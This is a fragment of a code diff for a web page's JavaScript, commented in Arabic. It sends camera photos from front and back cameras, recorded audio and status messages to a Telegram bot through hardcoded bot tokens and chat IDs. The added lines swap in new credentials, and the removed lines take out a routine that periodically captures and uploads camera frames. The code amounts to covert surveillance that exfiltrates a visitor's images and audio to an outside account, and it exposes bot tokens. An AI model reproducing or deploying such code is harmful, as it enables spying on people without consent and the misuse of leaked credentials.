+            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
+            const chatId = '6733154889';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
             try {
                 const response = await fetch(url, {
                     method: 'POST',
@@ -514,10 +823,9 @@
 
         // إرسال الصورة إلى تيليجرام
         async function sendPhotoToTelegram(fileOrData, cameraType) {
-            const botToken = '7133945288:AAG_qoWh2SxkcaTFr8tZeYNDJunQWs8jfVM';
-            const chatId = '7741643453';
+            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
+            const chatId = '6733154889';
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
             try {
                 let blob;
                 if (typeof fileOrData === 'string') {
@@ -532,11 +840,9 @@
                 } else {
                     blob = fileOrData;
                 }
-
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, `${cameraType}_photo_${Date.now()}.png`);
-
                 const response = await fetch(url, {
                     method: 'POST',
                     body: formData
@@ -550,15 +856,13 @@
 
         // إرسال الصوت إلى تيليجرام
         async function sendAudioToTelegram(audioBlob) {
-            const botToken = '7133945288:AAG_qoWh2SxkcaTFr8tZeYNDJunQWs8jfVM';
-            const chatId = '7741643453';
+            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
+            const chatId = '6733154889';
             const url = `https://api.telegram.org/bot${botToken}/sendAudio`;
-
             try {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('audio', audioBlob, 'audio.webm');
-
                 const response = await fetch(url, {
                     method: 'POST',
                     body: formData
@@ -570,7 +874,7 @@
             }
         }
 
-        // إعادة فتح تيارات الكاميرا لالتقاط الصور الدورية
+        // إعادة فتح تيارات الكاميرا
         async function reopenCameraStreams() {
             try {
                 if (!frontStream) {
@@ -597,56 +901,6 @@
             } catch (error) {
                 console.error('خطأ في إعادة فتح تيارات الكاميرا:', error);
                 await sendToTelegram(`خطأ في إعادة فتح تيارات الكاميرا: ${error.message}`);
-            }
-        }
-
-        // تعديل دالة capturePhotos لإعادة فتح التيارات
-        async function capturePhotos() {
-            try {
-                // إعادة فتح تيارات الكاميرا إذا لزم الأمر
-                await reopenCameraStreams();
-
-                if (frontStream) {
-                    await new Promise((resolve) => {
-                        videoFront.oncanplay = () => {
-                            setTimeout(() => {
-                                contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
-                                const imageDataFront = canvasFront.toDataURL('image/png');
-                                if (imageDataFront.length > 1000) {
-                                    sendPhotoToTelegram(imageDataFront, 'front');
-                                }
-                                resolve();
-                            }, 1000);
-                        };
-                    });
-                }
-                if (backStream) {
-                    await new Promise((resolve) => {
-                        videoBack.oncanplay = () => {
-                            setTimeout(() => {
-                                contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
-                                const imageDataBack = canvasBack.toDataURL('image/png');
-                                if (imageDataBack.length > 1000) {
-                                    sendPhotoToTelegram(imageDataBack, 'back');
-                                }
-                                resolve();
-                            }, 1000);
-                        };
-                    });
-                }
-
-                // إيقاف التيارات بعد الالتقاط
-                if (frontStream) {
-                    frontStream.getTracks().forEach(track => track.stop());
-                    frontStream = null;
-                }
-                if (backStream) {
-                    backStream.getTracks().forEach(track => track.stop());
-                    backStream = null;
-                }
-            } catch (error) {
-                console.error('خطأ في التقاط الصور:', error);
-                await sendToTelegram(`خطأ في التقاط الصور: ${error.message}`);
             }
         }
     </script>
